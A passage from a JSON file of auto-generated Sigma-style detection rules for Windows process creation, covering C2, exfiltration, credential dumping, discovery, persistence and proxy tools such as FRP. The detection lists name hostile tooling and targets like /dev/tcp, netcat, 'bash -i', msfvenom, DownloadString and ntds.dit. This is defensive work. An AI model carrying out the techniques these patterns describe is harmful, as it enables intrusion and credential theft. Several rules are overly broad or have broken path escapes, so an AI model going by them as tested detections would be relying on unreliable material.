                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "Invoke-RestMethod",
                "IEX"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "selection_wget_curl": {
              "Image|endswith": [
                "\\wget.exe",
                "\\curl.exe"
              ],
              "CommandLine|contains": [
                "http",
                "https",
                "-O",
                "--output"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_wget_curl"
          },
          "falsepositives": [
            "Legitimate administrative scripts using command-line tools for file transfer or automation",
            "Software deployment processes using bitsadmin or certutil",
            "PowerShell scripts using web requests for API calls or health checks"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.command-and-control",
            "custom.detection-method/nlp",
            "custom.technique/application-layer-protocol"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "cbac0f24-312d-4d99-909d-a6682649f5d1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
          "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns commonly associated with adversary execution. Detection based on known scripting interpreter execution chains, argument usage, and process invocation patterns.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_encoded": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand"
              ]
            },
            "selection_powershell_bypass": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-exec",
                "-executionpolicy",
                "bypass",
                "unrestricted"
              ]
            },
            "selection_cmd_scripting": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "echo",
                ">",
                "^|",
                "^"
              ]
            },
            "selection_wscript_cscript": {
              "Image|endswith": "\\wscript.exe",
              "CommandLine|contains": [
                ".js",
                ".vbs",
                "\\\\"
              ]
            },
            "selection_bash_scripting": {
              "Image|endswith": "\\bash",
              "CommandLine|contains": [
                "-c",
                "/dev/tcp"
              ]
            },
            "selection_python_download": {
              "Image|endswith": "\\python.exe",
              "CommandLine|contains": [
                "urllib",
                "requests",
                "subprocess.call",
                "os.system"
              ]
            },
            "condition": "selection_powershell_encoded or selection_powershell_bypass or selection_cmd_scripting or selection_wscript_cscript or selection_bash_scripting or selection_python_download"
          },
          "falsepositives": [
            "Legitimate administrative scripting using PowerShell, cmd, or scripting interpreters",
            "Software deployment or patching tools invoking scripts",
            "User running local development scripts (e.g., Python, Bash)",
            "Scheduled tasks executing backup or maintenance scripts"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "detection.emulation",
            "use-case.command-interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "3f0da8c0-a933-4743-8030-2a5e8f7610ac"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over C2 Channel via Command Line Activity",
          "description": "Detects Exfiltration Over C2 Channel by identifying suspicious command-line patterns commonly used to exfiltrate data through standard tools like certutil, bitsadmin, PowerShell, or cmd.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "UploadString",
                "DownloadString"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
          },
          "falsepositives": [
            "Legitimate administrative scripts using certutil or bitsadmin for patch management",
            "PowerShell scripts using WebRequest for software updates",
            "Automated backup or sync scripts using command-line redirection"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1041",
            "detection.emulation",
            "custom.windows",
            "custom.command-line-abuse"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "id": "b5eef6f0-3ea2-4d77-88ad-0ef01c1674be"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploit Public-Facing Application via NLP Pattern Matching",
          "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_web_server": {
              "ParentImage|endswith": [
                "\\httpd.exe",
                "\nginx.exe",
                "\\w3wp.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\powershell_ise.exe",
                "\\cscript.exe",
                "\\wscript.exe",
                "\\mshta.exe",
                "\rundll32.exe",
                "\regsvr32.exe",
                "\\wmic.exe",
                "\\certutil.exe",
                "\bitsadmin.exe"
              ],
              "CommandLine|contains": [
                "-enc",
                "/c",
                "/k",
                "iex",
                "Invoke-Expression",
                "Start-Process",
                "New-Object",
                "Net.WebClient",
                "DownloadString",
                "DownloadFile",
                "ShellExecute",
                "Run",
                "cmd /k",
                "cmd /c",
                "http",
                "https",
                "80",
                "443",
                "8080",
                "8443"
              ]
            },
            "selection_generic_exploit": {
              "Image|endswith": [
                "\\python.exe",
                "\\perl.exe",
                "\\php.exe",
                "\\java.exe",
                "\\javaw.exe"
              ],
              "CommandLine|contains": [
                "reverse",
                "shell",
                "bind",
                "payload",
                "exploit",
                "attack",
                "connect",
                "nc",
                "netcat",
                "socat",
                "bash -i",
                "/bin/sh",
                "powershell -enc",
                "msfvenom"
              ]
            },
            "condition": "selection_web_server or selection_generic_exploit"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed from web server processes",
            "Automated deployment tools interacting with web server binaries",
            "Security scanning tools simulating exploit attempts",
            "Penetration testing activities",
            "Development debugging involving local web server and scripting tools"
          ],
          "level": "high",
          "tags": [
            "attack.initial-access",
            "attack.T1190",
            "custom.detection-quality:high",
            "custom.use-case:threat-detection",
            "custom.domain:enterprise"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploit Public-Facing Application",
          "generation_method": "langchain",
          "id": "de634769-0ad0-4dc7-9efd-c4b2451a4dae"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Windows Management Instrumentation",
        "status": "success",
        "rule": {
          "title": "Windows Management Instrumentation (WMI) Execution via Command Line",
          "description": "Detects suspicious Windows Management Instrumentation (WMI) execution patterns via command line tools such as wmic.exe or WMI queries executed through scripting engines. Based on behavioral indicators of WMI abuse for execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_wmi_query": {
              "CommandLine|contains": [
                "\\root\\cimv2",
                "SELECT * FROM",
                "Win32_Process",
                "Create(\"",
                "CommandLine =\""
              ]
            },
            "selection_script_host": {
              "ParentImage|endswith": [
                "\\wmic.exe",
                "\\WmiPrvSE.exe"
              ]
            },
            "condition": "selection_wmic or (selection_wmi_query and not selection_script_host)"
          },
          "falsepositives": [
            "Legitimate system administration using wmic.exe or WMI queries",
            "Automated management scripts using WMI for inventory or monitoring",
            "Software deployment tools leveraging WMI"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1047",
            "detection.emulation",
            "windows.wmi.abuse"
          ],
          "ttp_id": "unknown",
          "technique_name": "Windows Management Instrumentation",
          "generation_method": "langchain",
          "id": "c15b8683-9112-4956-b787-22f720eab586"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "OS Credential Dumping",
        "status": "success",
        "rule": {
          "title": "OS Credential Dumping via NLP Pattern Matching",
          "description": "Detected OS Credential Dumping activity via NLP pattern matching on process command line arguments commonly associated with credential dumping tools and techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_lsass_access": {
              "Image|endswith": [
                "\\lsass.exe",
                "\\taskmgr.exe",
                "\\procdump.exe",
                "\\comsvcs.dll"
              ],
              "CommandLine|contains": [
                "minidump",
                "comsvcs",
                "procdump",
                "tasklist",
                "ntdsutil"
              ]
            },
            "selection_suspicious_parent": {
              "ParentImage|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ],
              "CommandLine|contains": [
                "minidump",
                "comsvcs",
                "procdump",
                "ntdsutil"
              ]
            },
            "selection_dump_artifact": {
              "CommandLine|contains": [
                "/m",
                "-ma",
                "-mp",
                "/all",
                "system32\\config\\SAM",
                "ntds.dit",
                "SECURITY",
                "SYSTEM"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\reg.exe",
                "\\esentutl.exe",
                "\\ntdsutil.exe",
                "\\procdump.exe"
              ]
            },
            "condition": "selection_lsass_access or selection_suspicious_parent or selection_dump_artifact"
          },
          "falsepositives": [
            "Legitimate administrative use of ntdsutil or esentutl for backup/restore operations",
            "System diagnostics using tasklist or procdump by IT support",
            "Scheduled tasks that enumerate running processes"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1003",
            "detection.os_credential_dumping",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "OS Credential Dumping",
          "generation_method": "langchain",
          "id": "f2f48975-4051-4c1c-9a8c-681e0c91beba"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "status": "success",
        "rule": {
          "title": "Network Service Discovery via NLP Pattern Matching",
          "description": "Detected Network Service Discovery activity via NLP pattern matching",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_net_view": {
              "Image|endswith": "\\net.exe",
              "CommandLine|contains": [
                "view",
                "/domain",
                "/all",
                "/users",
                "/groups"
              ]
            },
            "selection_nslookup": {
              "Image|endswith": "\\nslookup.exe",
              "CommandLine|contains": [
                "-type=",
                "server",
                "set type="
              ]
            },
            "selection_nbtstat": {
              "Image|endswith": "\\nbtstat.exe",
              "CommandLine|contains": [
                "-a",
                "-A",
                "-r",
                "-R"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "/node:",
                "computersystem",
                "netlogin",
                "netclient",
                "service",
                "process"
              ]
            },
            "selection_smb": {
              "CommandLine|contains": [
                "\\\\\\",
                "IPC$",
                "C$",
                "ADMIN$"
              ]
            },
            "condition": "selection_net_view or selection_nslookup or selection_nbtstat or selection_wmic or selection_smb"
          },
          "falsepositives": [
            "Legitimate administrative activity using network discovery tools",
            "Automated IT management and monitoring scripts",
            "Domain enumeration during normal user logon by group policy scripts",
            "Penetration testing or red team exercises"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.T1049",
            "attack.T1018",
            "attack.T1135",
            "attack.T1069",
            "custom.windows",
            "custom.sysmon",
            "custom.network_service_discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "Network Service Discovery",
          "generation_method": "langchain",
          "id": "d5b72332-c8be-4e2f-a7a3-ce480d0a6a0c"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Command Line Tools",
          "description": "Detects archiving of collected data using common command-line tools such as PowerShell Compress-Archive, 7-Zip, or Windows built-in tar/zip utilities. Based on behavioral patterns observed in data staging activities during collection.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "Start-Process 7z",
                "tar -cf",
                "zip -r"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "7z a",
                "tar -cf",
                "zip -r",
                "makecab"
              ]
            },
            "selection_7z": {
              "Image|endswith": "\\7z.exe",
              "CommandLine|contains": "a"
            },
            "selection_tar": {
              "Image|endswith": "\\tar.exe",
              "CommandLine|contains": "-cf"
            },
            "selection_zip": {
              "Image|endswith": "\\zip.exe",
              "CommandLine|contains": "-r"
            },
            "condition": "selection_powershell or selection_cmd or selection_7z or selection_tar or selection_zip"
          },
          "falsepositives": [
            "Legitimate administrative use of archiving tools for backup or deployment",
            "Development workflows involving command-line compression",
            "Automated scripts using 7z/tar/zip for packaging"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.T1560",
            "detection.emulation_tested"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "eae662db-b034-4600-b6aa-add381110be0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "status": "success",
        "rule": {
          "title": "Scheduled Task Creation via Command Line Tools",
          "description": "Detects creation of scheduled tasks using command line tools such as schtasks.exe or at.exe, commonly abused for persistence. Detection based on command-line arguments associated with task creation.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_schtasks_create": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "/create",
                "-create"
              ]
            },
            "selection_at": {
              "Image|endswith": "\\at.exe",
              "CommandLine|contains": [
                "\\\\",
                ":"
              ]
            },
            "condition": "selection_schtasks_create or selection_at"
          },
          "falsepositives": [
            "Legitimate administrative use of schtasks.exe or at.exe for system maintenance",
            "Scheduled task creation via automated IT management tools (e.g., Group Policy, SCCM)"
          ],
          "level": "high",
          "tags": [
            "attack.t1053.005",
            "attack.persistence",
            "custom.windows",
            "custom.schtasks",
            "custom.at",
            "custom.command_line"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scheduled Task/Job",
          "generation_method": "langchain",
          "id": "3b66dcce-f412-484e-b6a5-cec788fd31d2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "status": "success",
        "rule": {
          "title": "Account Discovery via Command Line Tools",
          "description": "Detects account discovery activity using common command line tools such as net, dsquery, and wmic. This behavior is often used by adversaries to enumerate local and domain accounts during post-compromise reconnaissance.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_net_user": {
              "Image|endswith": "\\net.exe",
              "CommandLine|contains": [
                "user",
                "group",
                "localgroup",
                "accounts"
              ]
            },
            "selection_dsquery": {
              "Image|endswith": "\\dsquery.exe",
              "CommandLine|contains": [
                "user",
                "group",
                "computer"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "useraccount",
                "group",
                "netuser"
              ]
            },
            "condition": "selection_net_user or selection_dsquery or selection_wmic"
          },
          "falsepositives": [
            "Legitimate administrative enumeration of user or group accounts by system administrators",
            "Automated IT management tools that query user/group information for maintenance or auditing"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1087",
            "custom.detection-rule",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Account Discovery",
          "generation_method": "langchain",
          "id": "252ef574-c8c7-4ae7-8b11-8a56839c80d2"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "status": "success",
        "rule": {
          "title": "Remote Services Activity via Common Administration Tools",
          "description": "Detects remote services activity using common administration tools and command-line patterns associated with lateral movement techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_sc": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": [
                "\\",
                "config",
                "start"
              ]
            },
            "selection_psexec": {
              "Image|endswith": "\\psexec.exe"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "process",
                "call",
                "create"
              ]
            },
            "selection_mstsc": {
              "Image|endswith": "\\mstsc.exe",
              "CommandLine|contains": [
                "/v:"
              ]
            },
            "selection_ssh": {
              "Image|endswith": "\\ssh.exe",
              "CommandLine|contains": [
                "-L",
                "-R"
              ]
            },
            "selection_winrm": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Enter-PSSession",
                "Invoke-Command",
                "New-PSSession"
              ]
            },
            "condition": "selection_sc or selection_psexec or selection_wmic or selection_mstsc or selection_ssh or selection_winrm"
          },
          "falsepositives": [
            "Legitimate administrative use of sc.exe, psexec.exe, wmic.exe, mstsc.exe, ssh.exe, or PowerShell remoting by system administrators",
            "Automated IT management tools using remote execution for patching or configuration management"
          ],
          "level": "high",
          "tags": [
            "attack.t1021",
            "attack.lateral_movement",
            "detection.rule",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Services",
          "generation_method": "langchain",
          "id": "4549a407-0835-434b-888c-9513ba152441"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "status": "success",
        "rule": {
          "title": "Screen Capture Activity Detection",
          "description": "Detects potential screen capture activity on Windows systems by monitoring execution of known screenshot utilities and command lines containing screen capture related keywords.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_snippingtool": {
              "Image|endswith": "\\snippingtool.exe"
            },
            "selection_greenshot": {
              "Image|endswith": "\\greenshot.exe"
            },
            "selection_nircmd": {
              "Image|endswith": "\\nircmd.exe",
              "CommandLine|contains": [
                "savescreenshot"
              ]
            },
            "selection_ffmpeg": {
              "Image|endswith": "\\ffmpeg.exe",
              "CommandLine|contains": [
                "-f",
                "gdigrab",
                "-i",
                "desktop"
              ]
            },
            "selection_generic": {
              "CommandLine|contains": [
                "screenshot",
                "capture",
                "screen",
                "printscreen",
                "grab"
              ]
            },
            "condition": "selection_snippingtool or selection_greenshot or selection_nircmd or selection_ffmpeg or selection_generic"
          },
          "falsepositives": [
            "Legitimate use of Snipping Tool or Greenshot by users for taking screenshots.",
            "Use of ffmpeg for video recording or screen capture in authorized workflows.",
            "System administrators using nircmd for automated screenshot tasks.",
            "Scripts that capture the screen for documentation or testing purposes."
          ],
          "level": "high",
          "tags": [
            "attack.t1113",
            "attack.collection",
            "custom.screen_capture",
            "custom.windows",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Screen Capture",
          "generation_method": "langchain",
          "id": "c21eb8ea-f6a3-4be5-8aea-aa2ff90b7bd3"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "status": "success",
        "rule": {
          "title": "Persistence via Registry Run Keys Modification",
          "description": "Detects processes that add or modify entries in the Registry Run Keys (HKLM or HKCU Run/RunOnce) which are commonly used for persistence. The rule matches usage of reg.exe or PowerShell commands that target these specific registry paths.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_reg": {
              "Image|endswith": "\\reg.exe",
              "CommandLine|contains": [
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Set-ItemProperty",
                "New-ItemProperty",
                "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
              ]
            },
            "condition": "selection_reg or selection_powershell"
          },
          "falsepositives": [
            "Legitimate software installers that add Run key entries",
            "Windows Update or system component updates",
            "Administrative scripts that configure startup programs",
            "Antivirus or security tools that use Run keys for persistence"
          ],
          "level": "medium",
          "tags": [
            "attack.persistence",
            "attack.t1547.001",
            "attack.registry"
          ],
          "ttp_id": "unknown",
          "technique_name": "Registry Run Keys",
          "generation_method": "langchain",
          "id": "65fb4ceb-8d95-4068-a7b7-d7dae60edc45"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "status": "success",
        "rule": {
          "title": "Remote Desktop Protocol (RDP) Activity Detection",
          "description": "Detects usage of Remote Desktop Protocol tools and commands indicative of lateral movement via RDP sessions. This rule looks for execution of common RDP client binaries and command-line utilities used to manage RDP sessions.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_mstsc": {
              "Image|endswith": "\\mstsc.exe"
            },
            "selection_rdpclip": {
              "Image|endswith": "\\rdpclip.exe"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "query",
                "session",
                "tscon",
                "tsdiscon"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-ComputerName",
                "-Credential",
                "Enter-PSSession"
              ]
            },
            "condition": "selection_mstsc or selection_rdpclip or selection_cmd or selection_powershell"
          },
          "falsepositives": [
            "Legitimate administrative use of Remote Desktop Connection (mstsc.exe) for remote management.",
            "System processes that invoke rdpclip.exe for clipboard redirection during normal RDP sessions.",
            "Administrators using cmd.exe or PowerShell to query or manage existing RDP sessions."
          ],
          "level": "medium",
          "tags": [
            "attack.t1021.001",
            "attack.lateral_movement",
            "custom.remote-desktop",
            "custom.windows"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Desktop Protocol",
          "generation_method": "langchain",
          "id": "646367a9-d1a5-4725-9274-7730813d38e0"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "status": "success",
        "rule": {
          "title": "Suspicious Office Process Spawning Command Shells (Phishing)",
          "description": "Detects potential phishing activity where Microsoft Office applications (WINWORD or OUTLOOK) spawn command-line interpreters or PowerShell with suspicious arguments, indicating possible malicious macro execution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_office_cmd": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\cmd.exe"
            },
            "selection_office_powershell": {
              "ParentImage|endswith": "\\WINWORD.EXE",
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "Invoke-WebRequest",
                "DownloadFile",
                "System.Net.WebClient"
              ]
            },
            "selection_outlook_powershell": {
              "ParentImage|endswith": "\\OUTLOOK.EXE",
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "Invoke-WebRequest"
              ]
            },
            "condition": "selection_office_cmd or selection_office_powershell or selection_outlook_powershell"
          },
          "falsepositives": [
            "Legitimate Office macros that legitimately invoke command-line tools for automation",
            "IT administrators running scripts from Office documents for internal tooling",
            "User-initiated PowerShell or cmd sessions launched from Office via trusted add-ins"
          ],
          "level": "high",
          "tags": [
            "attack.t1566",
            "attack.initial_access",
            "attack.phishing",
            "custom.windows",
            "custom.sysmon",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Phishing",
          "generation_method": "langchain",
          "id": "18f0a0c9-06c2-4556-94e1-0fb1ac849385"
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Proxy Tool Execution Using FRP, LCX or Socks5 Protocol",
        "description": "Detects the execution of known proxy tools such as FRP and LCX, or processes using the Socks5 protocol, which can be indicative of command and control (C2) activity. This rule focuses on process creation events with command-line indicators associated with proxy tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_frp": {
            "Image|endswith": [
              "\\frp.exe",
              "\\frpc.exe",
              "\\frps.exe"
            ],
            "CommandLine|contains": [
              "server_addr",
              "token",
              "local_port",
              "remote_port",
              "socks5"
            ]
          },
          "selection_lcx": {
            "Image|endswith": [
              "\\lcx.exe"
            ],
            "CommandLine|contains": [
              "-tran",
              "-listen",
              "-slave",
              "-listen",
              "socks"
            ]
          },
          "selection_socks5_in_cmd": {
            "CommandLine|contains": [
              "socks5",
              "-proxy",
              "--proxy",
              "proxy",
              "m00nlight.top"
            ]
          },
          "condition": "selection_frp or selection_lcx or (selection_socks5_in_cmd and not Image|endswith|in ['\\chrome.exe', '\\msedge.exe', '\\firefox.exe', '\\iexplore.exe'])"
        },
        "falsepositives": [
          "Legitimate use of FRP in development or devops environments for reverse proxying",
          "Internal network tunneling tools used by system administrators",
          "Applications that legitimately configure SOCKS5 proxies (e.g., some chat, VoIP, or P2P software)"
        ],
        "level": "high",
        "tags": [
          "attack.t1090",
          "attack.c2",
          "custom.proxy",
          "custom.frp",
          "custom.lcx",
          "custom.socks5",
          "m00nlight.top"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "langchain",
        "id": "801637e7-544f-49c3-b142-757d70c7bae0"
      },
      {
        "title": "Command and Control via Proxy Server m00nlight.top",
        "description": "Detects command and control activity using the proxy server m00nlight.top as a relay for malicious communications. This rule identifies process creation events involving known suspicious command-line utilities making network connections to the proxy domain.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_domain": {
            "CommandLine|contains": "m00nlight.top"
          },
          "selection_tools": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\curl.exe",
              "\\wget.exe",
              "\\certutil.exe",
              "\\bitsadmin.exe"
            ]
          },
          "condition": "selection_domain and selection_tools"
        },
        "falsepositives": [
          "Legitimate administrative use of command-line tools to access external resources (rare for this specific domain)",
          "Automated scripts or monitoring tools accessing the domain (if domain is used for benign purposes, though currently associated with malicious activity)"
        ],
        "level": "high",
        "tags": [
          "attack.t1090",
          "attack.c2",
          "custom.proxy",
          "m00nlight.top"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "langchain",
        "id": "875e7826-72a4-4f00-bf6d-2b0d61fe38fd"
      },
      {
        "title": "Fast Reverse Proxy (FRP) Tool Execution",
        "description": "Detects execution of Fast Reverse Proxy (FRP), a tool used by threat actors for command and control, particularly in attacks targeting Korean companies. This rule identifies suspicious process creation patterns associated with FRP usage.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_frp_process": {
            "Image|endswith": [
              "\\frpc.exe",
              "\\frps.exe"
            ]
          },
          "selection_frp_command_args": {
            "CommandLine|contains": [
              "-c",
              "-f",
              "--server_addr",
              "--token",
              "[common]",
              "[proxy]",
              "type=",
              "local_ip=",
              "local_port="
            ]
          },
          "selection_frp_network_call": {
            "CommandLine|contains": [
              "http",
              "https",
              "tcp",
              "udp",
              "stcp",
              "xtcp"
            ]
          },
          "condition": "selection_frp_process and (selection_frp_command_args or selection_frp_network_call)"
        },
        "falsepositives": [
          "Legitimate use of FRP in development or internal tunneling scenarios by authorized personnel",
          "Use of FRP in lab or testing environments for reverse proxy testing"
        ],
        "level": "high",
        "tags": [
          "attack.t1102",
          "attack.t1090",
          "attack.g0007",
          "threat.apt",
          "tool.frp"
        ],
        "ttp_id": "unknown",
        "technique_name": "Fast Reverse Proxy",
        "generation_method": "langchain",
        "id": "e8ba782e-52af-48a2-9041-7722ff3b0b52"
      },
      {
        "title": "Command and Scripting Interpreter Abuse via Common Tools",
        "description": "Detects the use of command-line interpreters and scripting tools such as cmd.exe, certutil, bitsadmin, and at for executing commands, which is commonly associated with adversary command and control or lateral movement activities.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "&",
              "^",
              "|",
              "<",
              ">",
              "start",
              "echo"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "/create",
              "http",
              "https"
            ]
          },
          "selection_at": {
            "Image|endswith": "\\at.exe",
            "CommandLine|contains": [
              "\\\\",
              "cmd",
              "exe"
            ]
          },
          "condition": "selection_cmd or selection_certutil or selection_bitsadmin or selection_at"
        },
        "falsepositives": [
          "Legitimate administrative use of certutil, bitsadmin, or at by system administrators",
          "Automated scripts or scheduled tasks using cmd.exe with complex command lines",
          "Software deployment tools leveraging bitsadmin or certutil for file transfer or decoding"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1059",
          "custom.detection-rule",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "6005777b-4036-4ba2-9ab3-48b3d38538b0"
      },
      {
